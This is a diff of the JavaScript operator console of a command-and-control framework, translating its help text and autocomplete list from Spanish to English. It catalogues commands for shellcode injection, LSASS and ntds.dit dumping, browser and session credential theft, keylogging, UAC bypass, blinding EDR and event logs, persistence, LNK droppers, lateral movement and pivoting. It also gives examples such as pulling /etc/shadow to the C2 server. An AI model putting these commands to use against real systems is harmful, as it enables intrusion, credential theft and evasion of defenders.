+  ['dotnet-asm','dotnet-asm <asm.exe> [proc]  — .NET → Donut (shellcode) → APC into new sacrificial process; no visible CLR'],
+  ['dotnet-exec','dotnet-exec <asm.exe> [args]  — .NET inline-execute: native in-process CLR, captures Console.Write (Rubeus, Seatbelt, SharpHound)'],
+  ['forkrun','forkrun <sc.bin> [proc]  — PPID spoof + section map + thread hijack in sacrificial proc'],
+  ['stage2','stage2 <sc.bin>  — in-process shellcode (CreateThread in current agent, bypasses Defender)'],
+  ['bof','bof <name|file.o> [args]  — name=server BOF; file.o=uploaded with upload'],
+  ['clrstomp','clrstomp <asm.exe> [args]  — .NET without Donut/new process: CLR via legitimate GAC, stomps memory with your assembly; stealthier than dotnet-asm'],
+  ['thread-hijack','thread-hijack <pid> <sc.bin>  — section map + patch thread RIP (no CreateRemoteThread)'],
+  ['hook-check','hook-check  — scan ntdll/kernel32 for EDR hooks (E9/CC/FF25)'],
+  ['hw-bp-check','hw-bp-check  — detect active hardware breakpoints (DR0–DR3)'],
+  ['pe-exec','pe-exec <file.exe> [args]  — load and execute native PE in memory without touching disk'],
+  ['mem-fluctuate','mem-fluctuate start [secs] | stop  — XOR-mutate agent internal buffers against periodic scans'],
+  ['encode-uuid','encode-uuid <sc.bin>  — generate C code with UUIDs (UuidFromStringA) ready to compile'],
   ['token','token whoami|steal <pid>|make <u> <p>|drop'],
   ['token whoami',''],
   ['token steal','token steal <pid>'],
@@ -9302,40 +9302,40 @@ const AC_COMMANDS = [
   ['token drop',''],
   ['make-token','make-token domain\\user password'],
   ['steal-token','steal-token <pid>'],
-  ['rev2self','revertir al token original del proceso'],
-  ['getsystem','getsystem — escalar a SYSTEM vía named pipe impersonation'],
+  ['rev2self','revert to original process token'],
+  ['getsystem','getsystem — escalate to SYSTEM via named pipe impersonation'],
   ['keylog','keylog start|stop|dump'],
   ['keylog start',''],
   ['keylog stop',''],
   ['keylog dump',''],
-  ['clip','leer portapapeles'],
-  ['minidump','minidump [pid]  — volcar proceso a .dmp (sin pid → lsass.exe)'],
+  ['clip','read clipboard'],
+  ['minidump','minidump [pid]  — dump process to .dmp (no pid → lsass.exe)'],
   ['port-scan','port-scan <target> <ports> [ms]'],
-  ['persist','persist run-key — registro HKCU Run'],
-  ['persist task','persist task [nombre] — tarea programada'],
-  ['persist rm','persist rm — eliminar persistencia'],
-  // SHELL INTERACTIVA
-  ['ishell','ishell cmd|ps — abrir shell interactiva persistente'],
-  ['ishell cmd','ishell cmd — abrir cmd.exe interactivo'],
-  ['ishell ps','ishell ps — abrir PowerShell interactivo'],
-  ['ishell exit','cerrar shell interactiva'],
+  ['persist','persist run-key — HKCU Run registry'],
+  ['persist task','persist task [name] — scheduled task'],
+  ['persist rm','persist rm — remove persistence'],
+  // INTERACTIVE SHELL
+  ['ishell','ishell cmd|ps — open persistent interactive shell'],
+  ['ishell cmd','ishell cmd — open interactive cmd.exe'],
+  ['ishell ps','ishell ps — open interactive PowerShell'],
+  ['ishell exit','close interactive shell'],
   // PIVOT
-  ['socks5 start','socks5 start <port> — proxy SOCKS5 (sin auth en Rust/C/Nim)'],
-  ['socks5 stop','cerrar proxy SOCKS5'],
-  ['socks','socks <port> [user:pass] — proxy SOCKS5 (auth opcional, RFC 1929)'],
-  ['socks start','socks start <port> [user:pass] — proxy SOCKS5'],
-  ['socks stop','cerrar proxy SOCKS5'],
-  ['rsocks start','rsocks start [port] [user:pass]  — reverse SOCKS5: agente conecta al C2 (bypasa NAT)'],
+  ['socks5 start','socks5 start <port> — SOCKS5 proxy (no auth on Rust/C/Nim)'],
+  ['socks5 stop','close SOCKS5 proxy'],
+  ['socks','socks <port> [user:pass] — SOCKS5 proxy (optional auth, RFC 1929)'],
+  ['socks start','socks start <port> [user:pass] — SOCKS5 proxy'],
+  ['socks stop','close SOCKS5 proxy'],
+  ['rsocks start','rsocks start [port] [user:pass]  — reverse SOCKS5: agent connects to C2 (bypasses NAT)'],
   ['rsocks stop',''],
-  ['portfwd add','portfwd add [tcp|udp] <lport> <rhost> <rport>  — reenvío: lport agente → rhost:rport'],
+  ['portfwd add','portfwd add [tcp|udp] <lport> <rhost> <rport>  — forward: agent lport → rhost:rport'],
   ['portfwd del','portfwd del [tcp|udp] <lport>'],
   ['portfwd list',''],
   ['link start','link start [pipename]'],
   ['link stop',''],
-  ['httpivot start','httpivot start [port]  — servidor HTTP en agente que enruta hacia red interna del objetivo'],
+  ['httpivot start','httpivot start [port]  — HTTP server on agent that routes to target internal network'],
   ['httpivot stop',''],
-  ['tcppivot start','tcppivot start [port]  — escucha TCP en agente; agentes hijo apuntan aquí con Transport=tcp'],
-  ['tcppivot stop','tcppivot stop [port]  — detiene pivot TCP (sin puerto = todos)'],
+  ['tcppivot start','tcppivot start [port]  — TCP listener on agent; child agents point here with Transport=tcp'],
+  ['tcppivot stop','tcppivot stop [port]  — stop TCP pivot (no port = stop all)'],
   ['winrm exec','winrm exec <t> <u> <p> <cmd>'],
   ['winrm deploy','winrm deploy <t> <u> <p> <cradle>'],
   // ── Lateral movement (stage + exec in one shot) ──────────────────────────
@@ -9345,68 +9345,68 @@ const AC_COMMANDS = [
   ['jump winrm',   'jump winrm   <host> <payload.exe> [DOMAIN\\user] [pass] — SMB C$ + WinRM Invoke-Command'],
   ['jump ssh',     'jump ssh     <host> <payload.exe> <user> <pass>         — SCP upload + SSH exec (Linux targets)'],
   ['jump dcom',    'jump dcom    <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + MMC20.Application DCOM'],
-  ['jump smbexec', 'jump smbexec <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + cmd.exe service (SERVICES→cmd→agent, sin IOC de binario como servicio)'],
-  ['jump atexec',  'jump atexec  <host> <payload.exe> [DOMAIN\\user] [pass] — MS-TSCH scheduled task, runas SYSTEM, se autodestruye (impacket atexec style)'],
-  ['jump runas',   'jump runas   <host> <payload.exe> <user> <pass>         — schtasks privesc: ejecuta payload como usuario local (mismo host)'],
-  ['token-store steal','token-store steal <pid> — robar token de proceso y guardar en store'],
-  ['token-store use','token-store use <id> — usar token del store'],
-  ['token-store show','token-store show — listar tokens guardados'],
-  ['token-store remove','token-store remove <id> — eliminar token del store'],
-  ['token-store clear','token-store clear — vaciar token store'],
-  ['screenwatch start','screenwatch start [secs] — screenshots continuos (default: 30s)'],
-  ['screenwatch stop','screenwatch stop — detener screenshots continuos'],
-  ['bof-store load','bof-store load <name> <file.coff> — precargar BOF en memoria'],
-  ['bof-store list','bof-store list — listar BOFs precargados'],
-  ['bof-store unload','bof-store unload <name> — eliminar BOF del store'],
+  ['jump smbexec', 'jump smbexec <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + cmd.exe service (SERVICES→cmd→agent, no binary-as-service IOC)'],
+  ['jump atexec',  'jump atexec  <host> <payload.exe> [DOMAIN\\user] [pass] — MS-TSCH scheduled task, runas SYSTEM, self-deletes (impacket atexec style)'],
+  ['jump runas',   'jump runas   <host> <payload.exe> <user> <pass>         — schtasks privesc: run payload as local user (same host)'],
+  ['token-store steal','token-store steal <pid> — steal process token and save to store'],
+  ['token-store use','token-store use <id> — use token from store'],
+  ['token-store show','token-store show — list saved tokens'],
+  ['token-store remove','token-store remove <id> — remove token from store'],
+  ['token-store clear','token-store clear — clear token store'],
+  ['screenwatch start','screenwatch start [secs] — continuous screenshots (default: 30s)'],
+  ['screenwatch stop','screenwatch stop — stop continuous screenshots'],
+  ['bof-store load','bof-store load <name> <file.coff> — preload BOF into memory'],
+  ['bof-store list','bof-store list — list preloaded BOFs'],
+  ['bof-store unload','bof-store unload <name> — unload BOF from in-memory store'],
   // L3 commands
-  ['edr-silence','edr-silence <pid> — bloquear tráfico saliente del EDR vía WFP'],
-  ['edr-silence-rm','edr-silence-rm <pid> — eliminar regla WFP del EDR'],
-  ['eventlog-suspend','eventlog-suspend — suspender threads del servicio EventLog (silenciar logs)'],
-  ['eventlog-resume','eventlog-resume — reanudar servicio EventLog'],
-  ['elevate fodhelper','elevate fodhelper <cmd> — UAC bypass vía fodhelper.exe'],
-  ['elevate computerdefaults','elevate computerdefaults <cmd> — UAC bypass vía ComputerDefaults.exe'],
-  ['elevate cmlua','elevate cmlua <cmd> — UAC bypass vía CMLua (alias fodhelper)'],
-  ['peb-spoof','peb-spoof <path> — enmascarar proceso en PEB (ej: C:\\Windows\\System32\\svchost.exe)'],
-  ['hwbp-clear','hwbp-clear — limpiar hardware breakpoints del EDR'],
-  ['ntds-dump','ntds-dump [outdir] — volcar ntds.dit vía ntdsutil (DA requerido)'],
+  ['edr-silence','edr-silence <pid> — block EDR outbound traffic via WFP'],
+  ['edr-silence-rm','edr-silence-rm <pid> — remove WFP rule for EDR process'],
+  ['eventlog-suspend','eventlog-suspend — suspend EventLog service threads (silence logs)'],
+  ['eventlog-resume','eventlog-resume — resume EventLog service'],
+  ['elevate fodhelper','elevate fodhelper <cmd> — UAC bypass via fodhelper.exe'],
+  ['elevate computerdefaults','elevate computerdefaults <cmd> — UAC bypass via ComputerDefaults.exe'],
+  ['elevate cmlua','elevate cmlua <cmd> — UAC bypass via CMLua (alias fodhelper)'],
+  ['peb-spoof','peb-spoof <path> — spoof process in PEB (e.g. C:\\Windows\\System32\\svchost.exe)'],
+  ['hwbp-clear','hwbp-clear — clear hardware breakpoints set by EDR'],
+  ['ntds-dump','ntds-dump [outdir] — dump ntds.dit via ntdsutil (DA required)'],
   // New features
   ['hollow','hollow [target.exe] <shellcode.bin> — process hollowing (NtUnmapViewOfSection + inject + hijack)'],
-  ['udrl','udrl <shellcode.bin> — phantom DLL loading (shellcode en memoria respaldada por DLL legítima)'],
-  ['blockdlls','blockdlls [on|off] — Microsoft-signed-only DLL policy (bloquea inyección de AV/EDR)'],
-  ['blockdlls on','blockdlls on — activar política firma Microsoft (BLOCKDLLS)'],
-  ['blockdlls off','blockdlls off — desactivar política firma Microsoft'],
-  ['gen-lnk','gen-lnk <target.exe> [args] <out.lnk> — generar dropper .lnk con icono camuflado'],
-  ['com-hijack','com-hijack <CLSID> <dll.dll> — hijack COM HKCU (sin admin, persiste en COM load)'],
-  ['com-hijack rm','com-hijack rm <CLSID> — eliminar hijack COM de HKCU'],
-  ['clip-monitor start','clip-monitor start [secs] — monitorizar portapapeles continuamente'],
-  ['clip-monitor dump','clip-monitor dump — recuperar entradas capturadas'],
-  ['clip-monitor stop','clip-monitor stop — detener monitor y volcar log'],
+  ['udrl','udrl <shellcode.bin> — phantom DLL loading (shellcode in memory backed by legitimate DLL)'],
+  ['blockdlls','blockdlls [on|off] — Microsoft-signed-only DLL policy (blocks AV/EDR injection)'],
+  ['blockdlls on','blockdlls on — enable Microsoft signature policy (BLOCKDLLS)'],
+  ['blockdlls off','blockdlls off — disable Microsoft signature policy'],
+  ['gen-lnk','gen-lnk <target.exe> [args] <out.lnk> — generate .lnk dropper with spoofed icon'],
+  ['com-hijack','com-hijack <CLSID> <dll.dll> — hijack COM HKCU (no admin, persists on COM load)'],
+  ['com-hijack rm','com-hijack rm <CLSID> — remove COM hijack from HKCU'],
+  ['clip-monitor start','clip-monitor start [secs] — monitor clipboard continuously'],
+  ['clip-monitor dump','clip-monitor dump — retrieve captured clipboard entries'],
+  ['clip-monitor stop','clip-monitor stop — stop monitor and dump log'],
   // Registry R/W
   ['reg','reg <query|set|delete|list> ...'],
-  ['reg query','reg query <HIVE\\Path> [ValueName] — leer valor o listar todos'],
-  ['reg set','reg set <HIVE\\Path> <Name> <Value> — escribir REG_SZ'],
-  ['reg delete','reg delete <HIVE\\Path> [ValueName] — borrar valor o clave entera'],
-  ['reg list','reg list <HIVE\\Path> — listar subclaves'],
+  ['reg query','reg query <HIVE\\Path> [ValueName] — read a value or list all values in key'],
+  ['reg set','reg set <HIVE\\Path> <Name> <Value> — write REG_SZ value'],
+  ['reg delete','reg delete <HIVE\\Path> [ValueName] — delete a value or entire key'],
+  ['reg list','reg list <HIVE\\Path> — list sub-keys'],
   // SSH exec
-  ['ssh-exec','ssh-exec <host> [port] <user> <pass> <cmd> — ejecutar comando vía SSH'],
-  // LSASS via NtReadVirtualMemory (sin MiniDumpWriteDump — evasión EDR)
-  ['lsass-dump-nt','lsass-dump-nt [pid] — volcar lsass con NtReadVirtualMemory y construir MDMP manual (evita MiniDumpWriteDump)'],
+  ['ssh-exec','ssh-exec <host> [port] <user> <pass> <cmd> — execute command via SSH'],
+  // LSASS via NtReadVirtualMemory (no MiniDumpWriteDump — EDR evasion)
+  ['lsass-dump-nt','lsass-dump-nt [pid] — dump lsass via NtReadVirtualMemory and build MDMP manually (avoids MiniDumpWriteDump)'],
   // ADCS certificate requests
-  ['adcs-request','adcs-request <ca> <template> <subject> [san=upn@domain] [out=C:\\path\\cert.pfx] — solicitar certificado vía certreq.exe (ESC1-6)'],
+  ['adcs-request','adcs-request <ca> <template> <subject> [san=upn@domain] [out=C:\\path\\cert.pfx] — request certificate via certreq.exe (ESC1-6)'],
   // BOF store info
-  ['bof-list','bof-list — mostrar info sobre tipos de argumentos BOF soportados'],
-  // DCSYNC — extracción nativa de ntds.dit + SYSTEM (sin SharpHound)
-  ['dcsync','dcsync [mode=ifm|vss] [out=C:\\path] — extraer ntds.dit + SYSTEM hive y subir al C2 (secretsdump.py offline)'],
-  ['dcsync ifm','dcsync ifm [out=C:\\path] — ntdsutil IFM snapshot (más sigiloso, no toca VSS)'],
-  ['dcsync vss','dcsync vss [out=C:\\path] — VSS shadow copy (funciona sin ntdsutil)'],
+  ['bof-list','bof-list — show info about supported BOF argument types'],
+  // DCSYNC — native extraction of ntds.dit + SYSTEM (no SharpHound)
+  ['dcsync','dcsync [mode=ifm|vss] [out=C:\\path] — extract ntds.dit + SYSTEM hive and upload to C2 (secretsdump.py offline)'],
+  ['dcsync ifm','dcsync ifm [out=C:\\path] — ntdsutil IFM snapshot (stealthier, no VSS touch)'],
+  ['dcsync vss','dcsync vss [out=C:\\path] — VSS shadow copy (works without ntdsutil)'],
   // Alternate Data Streams
-  ['ads','ads list|read|write|del <archivo>[:<stream>]'],
-  ['ads list','ads list <archivo> — listar streams ADS del archivo'],
-  ['ads read','ads read <archivo>:<stream> — leer contenido de un stream ADS'],
-  ['ads write','ads write <archivo>:<stream> <datos> — escribir datos en stream ADS'],
-  ['ads del','ads del <archivo>:<stream> — eliminar stream ADS'],
+  ['ads','ads list|read|write|del <file>[:<stream>]'],
+  ['ads list','ads list <file> — list ADS streams on file'],
+  ['ads read','ads read <file>:<stream> — read content of an ADS stream'],
+  ['ads write','ads write <file>:<stream> <data> — write data to ADS stream'],
+  ['ads del','ads del <file>:<stream> — delete ADS stream'],
   // Wipe PE headers
-  ['wipe-mz','wipe-mz — borrar cabecera MZ/PE del agente en memoria (anti-forensics)'],
+  ['wipe-mz','wipe-mz — zero MZ/PE header of agent in memory (anti-forensics)'],
 ];
 
 // Commands only available on Windows agents — hidden from autocomplete on Linux agents
@@ -9951,13 +9951,13 @@ function getHelpHTML_es(isWin) {
   job kill &lt;id&gt;                      detener un listener por ID
 
 <span class="console-section">LOCAL KALI  (!prefijo)</span>
-  !&lt;cmd&gt;                             ejecutar en Kali, output aquí mismo
+  !&lt;cmd&gt;                             run on Kali, output here
   !nxc smb &lt;t&gt; -u u -p p            netexec SMB
   !certipy-ad find -u u@d -p p ...  ADCS vuln scan
   !bloodhound-python -u u -p p ...  BloodHound collection
   !impacket-secretsdump d/u:p@t      DCSync / SAM dump
   !impacket-GetUserSPNs d/u:p ...    Kerberoasting
-  !impacket-wmiexec d/u:p@t &lt;cmd&gt;   ejecución remota
+  !impacket-wmiexec d/u:p@t &lt;cmd&gt;   remote execution
   !nmap -sV -p 445,88 &lt;t&gt;           port scan
 
 <span class="console-section">AGENTE</span>
@@ -9968,7 +9968,7 @@ function getHelpHTML_es(isWin) {
   results [n]                        historial de resultados (defecto 20)
   tasks [n]                          cola de tareas — pending, fetched, done (defecto 20)
   cleanup                            auto-eliminar del sistema
-  back                               cerrar consola
+  back                               close console
   kill                               terminar proceso del agente
 
 <span class="console-section">FILESYSTEM</span>
@@ -9978,7 +9978,7 @@ function getHelpHTML_es(isWin) {
   mv &lt;src&gt; &lt;dst&gt; / grep &lt;pat&gt; &lt;ruta&gt; mover / buscar texto
   mount / chmod &lt;modo&gt; &lt;ruta&gt;        puntos montados / permisos
   chown &lt;owner[:group]&gt; &lt;ruta&gt;       cambiar propietario (POSIX)
-  chtimes &lt;RFC3339&gt; &lt;ruta&gt;            cambiar fecha de modificación
+  chtimes &lt;RFC3339&gt; &lt;path&gt;            change modification date
   env                                  variables de entorno
 
 <span class="console-section">TRANSFERENCIA</span>
@@ -9990,26 +9990,26 @@ function getHelpHTML_es(isWin) {
   getpid                             PID del proceso agente
   ppid                               PPID del proceso padre del agente
   port-scan &lt;target&gt; &lt;puertos&gt; [ms]  TCP scan desde el agente (timeout por puerto en ms)
-  search &lt;patrón&gt; [ruta]             búsqueda recursiva de archivos en el objetivo (wildcards: *.kdbx *.pfx)
+  search &lt;pattern&gt; [path]            recursive file search on target (wildcards: *.kdbx *.pfx)
 ${isWin ? `
 <span class="console-section">COLECCIÓN</span>
   screenshot                         captura de pantalla → servidor
-  screenwatch start [secs] / stop    capturas periódicas automáticas (defecto cada 30s)
+  screenwatch start [secs] / stop    automatic periodic screenshots (default every 30s)
   keylog start|stop|dump             keylogger WH_KEYBOARD_LL (hook de teclado a nivel sistema)
   clip                               leer portapapeles (una vez)
   clip-monitor start / dump / stop   monitorizar portapapeles continuamente
   minidump [pid]                     volcar proceso a .dmp y descargarlo; sin pid → lsass.exe
-  lsass-dump-nt [pid]                volcar lsass vía NtReadVirtualMemory (bypasa hooks EDR)
-  ntds-dump [outdir]                 volcar ntds.dit vía ntdsutil (requiere DA)
+  lsass-dump-nt [pid]                dump lsass via NtReadVirtualMemory (bypasses EDR hooks)
+  ntds-dump [outdir]                 dump ntds.dit via ntdsutil (requires DA)
   dcsync [ifm|vss] [out=&lt;ruta&gt;]     extraer ntds.dit+SYSTEM hive y subir al C2 (secretsdump offline)
   browser-creds                      robar credenciales guardadas de Chrome/Edge/Brave
-  gpp-passwords                      buscar contraseñas GPP en shares SYSVOL (MS14-025)
-  wifi-creds                         volcar contraseñas de perfiles WiFi guardados
+  gpp-passwords                      search GPP passwords in SYSVOL shares (MS14-025)
+  wifi-creds                         dump saved WiFi profile passwords
   session-creds                      robar credenciales de PuTTY/WinSCP/FileZilla/RDP
-  gpp-hunt                           buscar contraseñas GPP en todos los shares SYSVOL del dominio
+  gpp-hunt                           search GPP passwords in all domain SYSVOL shares
 
 <span class="console-section">INYECCIÓN / EJECUCIÓN</span>
-  inject &lt;pid&gt; &lt;sc.bin&gt;             inyección clásica: WriteProcessMemory + CreateRemoteThread
+  inject &lt;pid&gt; &lt;sc.bin&gt;             classic injection: WriteProcessMemory + CreateRemoteThread
   inject-apc &lt;sc.bin&gt; [proc]        APC early-bird: spawnea [proc] suspendido, inyecta, reanuda
   forkrun &lt;sc.bin&gt; [proc]           PPID-spoof + section map + thread hijack en proceso sacrificial
   thread-hijack &lt;pid&gt; &lt;sc.bin&gt;     section map + parchear RIP de thread existente (sin CreateRemoteThread)
@@ -10020,7 +10020,7 @@ ${isWin ? `
 <span class="console-section">.NET / BOF</span>
   dotnet-exec &lt;asm.exe&gt; [args]      CLR inline-execute en-proceso — Rubeus, Seatbelt, SharpHound, etc.
   dotnet-asm &lt;asm.exe&gt; [proc]       .NET → Donut → APC en proceso sacrificial (sin CLR visible en agente)
-  clrstomp &lt;asm.exe&gt; [args]         .NET sin Donut ni proceso nuevo: sustituye assembly legítimo del GAC
+  clrstomp &lt;asm.exe&gt; [args]         .NET without Donut or new process: replaces legitimate GAC assembly
   bof &lt;nombre|archivo.o&gt; [args]     ejecutar BOF (COFF x64); nombre=preinstalado, archivo.o=subido
   bof list                           listar BOFs disponibles en servidor C2
   bof install                        clonar/actualizar colecciones de BOFs en servidor C2
@@ -10028,8 +10028,8 @@ ${isWin ? `
   bof-store unload &lt;nombre&gt;          descargar BOF del store en memoria del agente
 
 <span class="console-section">EVASIÓN</span>
-  blockdlls on|off                   política de proceso: bloquear DLLs no firmadas por Microsoft
-  edr-silence &lt;pid&gt;                 bloquear tráfico saliente del EDR vía WFP (Windows Filtering Platform)
+  blockdlls on|off                   process policy: block DLLs not signed by Microsoft
+  edr-silence &lt;pid&gt;                 block EDR outbound traffic via WFP (Windows Filtering Platform)
   edr-silence-rm &lt;pid&gt;              eliminar regla WFP para ese proceso
   eventlog-suspend                   suspender el servicio EventLog (sin generar logs mientras suspendido)
   eventlog-resume                    reanudar EventLog
@@ -10037,8 +10037,8 @@ ${isWin ? `
   hook-check                         escanear ntdll/kernel32 en busca de hooks EDR (E9/CC/FF25)
   hw-bp-check                        detectar hardware breakpoints activos en el thread actual (DR0–DR3)
   hwbp-clear                         eliminar hardware breakpoints activos (escribir 0 en DR0–DR3)
-  mem-fluctuate start [secs]|stop    XOR-muta periódicamente los buffers internos del agente en memoria
-  encode-uuid &lt;sc.bin&gt;              codifica shellcode como UUIDs; genera código C con UuidFromStringA
+  mem-fluctuate start [secs]|stop    periodically XOR-mutates agent internal buffers in memory
+  encode-uuid &lt;sc.bin&gt;              encodes shellcode as UUIDs; generates C code with UuidFromStringA
   ntdll-unhook                       restaurar ntdll desde copia limpia en disco (elimina hooks inline del EDR)
 
 <span class="console-section">TOKENS / PRIVESC</span>
@@ -10049,34 +10049,34 @@ ${isWin ? `
   steal-token &lt;pid&gt;                 alias: impersonar token (OpenProcess + DuplicateTokenEx)
   make-token &lt;dom\\user&gt; &lt;pass&gt;    alias: crear token logon
   rev2self                           revert al token original del proceso
-  getsystem                          escalar a SYSTEM vía named pipe impersonation
+  getsystem                          escalate to SYSTEM via named pipe impersonation
   token-store list                   listar tokens almacenados en el store
   token-store use &lt;id&gt;              aplicar token del store al thread actual
-  elevate fodhelper &lt;cmd&gt;           UAC bypass vía fodhelper.exe (requiere usuario en grupo Admin)
+  elevate fodhelper &lt;cmd&gt;           UAC bypass via fodhelper.exe (requires user in Admin group)
 
 <span class="console-section">PERSISTENCIA</span>
-  persist                            persistencia vía HKCU\\Run
-  persist task [nombre]              persistencia vía tarea programada onlogon
+  persist                            persistence via HKCU\\Run
+  persist task [name]                persistence via onlogon scheduled task
   persist rm                         eliminar persistencia activa
-  com-hijack &lt;clsid&gt; &lt;dll&gt;         hijacking de clave COM en HKCU (sin elevación)
+  com-hijack &lt;clsid&gt; &lt;dll&gt;         COM key hijacking in HKCU (no elevation)
   com-hijack rm &lt;clsid&gt;             eliminar hijacking COM
   gen-lnk &lt;target&gt; [args] [icon]    generar archivo .lnk (LNK phishing / autorun)
 
 <span class="console-section">MOVIMIENTO LATERAL</span>
   jump psexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMB ADMIN$ + servicio SCM temporal
-  jump smbexec &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMBExec (ejecución en memoria, sin binario en disco)
-  jump wmi     &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   ejecución vía WMI Win32_Process::Create
-  jump dcom    &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral vía DCOM MMC20.Application
-  jump atexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral vía schtask efímera (AT)
-  jump ssh     &lt;host&gt; &lt;payload.bin&gt; [user] [pass]   copia + ejecución vía SSH (Linux/Windows)
-  jump winrm   &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   copia payload.exe al target y lo ejecuta vía WinRM
-  winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          ejecutar comando suelto en host remoto vía WinRM
-  winrm deploy &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cradle_ps&gt;   ejecutar PowerShell one-liner/cradle en target vía WinRM
+  jump smbexec &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMBExec (in-memory execution, no binary on disk)
+  jump wmi     &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   execution via WMI Win32_Process::Create
+  jump dcom    &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral via DCOM MMC20.Application
+  jump atexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral via ephemeral schtask (AT)
+  jump ssh     &lt;host&gt; &lt;payload.bin&gt; [user] [pass]   copy + execute via SSH (Linux/Windows)
+  jump winrm   &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   copies payload.exe to target and runs via WinRM
+  winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          run a command on a remote host via WinRM
+  winrm deploy &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cradle_ps&gt;   run PowerShell one-liner/cradle on target via WinRM
 
 <span class="console-section">SHELL INTERACTIVA</span>
   ishell cmd                         abrir cmd.exe interactivo persistente
   ishell ps                          abrir PowerShell interactivo
-  ishell exit                        cerrar shell interactiva
+  ishell exit                        close interactive shell
 
 <span class="console-section">ANTI-FORENSICS</span>
   timestomp &lt;archivo&gt; [fecha|ref]    sobreescribir timestamps MACB (ref = ruta a copiar o YYYY-MM-DD)
@@ -10097,15 +10097,15 @@ ${isWin ? `
   socks stop
   socks5 start &lt;port&gt;               SOCKS5 proxy en el agente (sin auth en Rust/C/Nim)
   socks5 stop
-  rsocks start [port] [user:pass]   Reverse SOCKS5: el agente conecta al C2 (útil tras NAT)
+  rsocks start [port] [user:pass]   Reverse SOCKS5: agent connects to C2 (useful behind NAT)
   rsocks stop
-  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  reenvío de puerto del agente a host:puerto remoto
+  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  port forward from agent to remote host:port
   portfwd del [tcp|udp] &lt;lport&gt; / portfwd list
   httpivot start [port] / httpivot stop  servidor HTTP en el agente para proxychains
-  tcppivot start &lt;port&gt;             servidor TCP en el agente — agentes hijo conectan vía tcp:// transport
+  tcppivot start &lt;port&gt;             TCP server on agent — child agents connect via tcp:// transport
   tcppivot stop [port]               detener pivot TCP (sin puerto = detener todos)
-  ssh-exec &lt;host&gt; [port] &lt;u&gt; &lt;p&gt; &lt;cmd&gt;  ejecutar comando en host remoto vía SSH (autenticación password)
-${isWin ? `  link start [pipename] / link stop        conectar a agente hijo vía named pipe SMB (P2P)` : ''}`;
+  ssh-exec &lt;host&gt; [port] &lt;u&gt; &lt;p&gt; &lt;cmd&gt;  execute command on remote host via SSH (password auth)
+${isWin ? `  link start [pipename] / link stop        connect to child agent via SMB named pipe (P2P)` : ''}`;
 }
 
 // Per-command detailed help entries (used by `help <cmd>`)
@@ -10129,7 +10129,7 @@ ${isWin ? `  shell whoami /all
   <span class="console-section">NOTAS</span>
   • Usa ${isWin ? 'cmd.exe en Windows' : '/bin/sh en Linux'}
 ${isWin ? `  • Para PowerShell: shell powershell -nop -enc &lt;base64-UTF16LE&gt;
-  • Para comandos con comillas complejas, usar -enc evita problemas de escape` : `  • Para redirección: shell bash -c "cmd > /tmp/out.txt"
+  • For commands with complex quoting, use -enc to avoid escape issues` : `  • For redirection: shell bash -c "cmd > /tmp/out.txt"
   • Para pipes: shell bash -c "ps aux | grep nginx"`}`,
 
   'sleep': `<b>sleep</b> — cambiar el intervalo de beacon del agente
@@ -10145,7 +10145,7 @@ ${isWin ? `  • Para PowerShell: shell powershell -nop -enc &lt;base64-UTF16LE&
 
   <span class="console-section">NOTAS</span>
   • El agente aplica el cambio en el siguiente beacon
-  • Jitter ≥50% aumenta la evasión pero puede parecer inactivo`,
+  • Jitter ≥50% increases evasion but may appear inactive`,
 
   'info': `<b>info</b> — mostrar detalles del agente actual
 
@@ -10153,9 +10153,9 @@ ${isWin ? `  • Para PowerShell: shell powershell -nop -enc &lt;base64-UTF16LE&
   info
 
   <span class="console-section">SALIDA</span>
-  id, hostname, usuario, OS, IP, PID, transporte (http/mtls), sleep/jitter, última conexión`,
+  id, hostname, user, OS, IP, PID, transport (http/mtls), sleep/jitter, last beacon`,
 
-  'ps': (isWin) => `<b>ps</b> — listar procesos en ejecución en el objetivo
+  'ps': (isWin) => `<b>ps</b> — list running processes on the target
 
   <span class="console-section">USO</span>
   ps
@@ -10175,7 +10175,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • Solo Windows (Go agent)
-  • La imagen se descarga automáticamente al servidor y aparece en la pestaña Files
+  • The image is automatically downloaded to the server and appears in the Files tab
   • Si hay varias pantallas, captura el escritorio virtual completo`,
 
   'download': `<b>download</b> — descargar archivo del agente al servidor C2
@@ -10189,7 +10189,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   download /etc/shadow
 
   <span class="console-section">NOTAS</span>
-  • El archivo queda almacenado en el servidor, visible en la pestaña Files
+  • The file is stored on the server, visible in the Files tab
   • Para archivos bloqueados por el sistema (SAM, NTDS.dit) usar minidump o VSS`,
 
   'upload': `<b>upload</b> — subir archivo desde el servidor C2 al agente
@@ -10203,10 +10203,10 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   upload pivot.bin /tmp/pivot.bin
 
   <span class="console-section">NOTAS</span>
-  • &lt;nombre_en_servidor&gt; es el nombre del archivo ya subido al servidor C2 (pestaña Files)
-  • Primero sube el archivo al servidor usando el botón Upload en Files, luego usa este comando`,
+  • &lt;server_filename&gt; is the name of the file already uploaded to the C2 server (Files tab)
+  • First upload the file to the server using the Upload button in Files, then use this command`,
 
-  'inject': `<b>inject</b> — inyección clásica en proceso existente
+  'inject': `<b>inject</b> — classic injection into an existing process
 
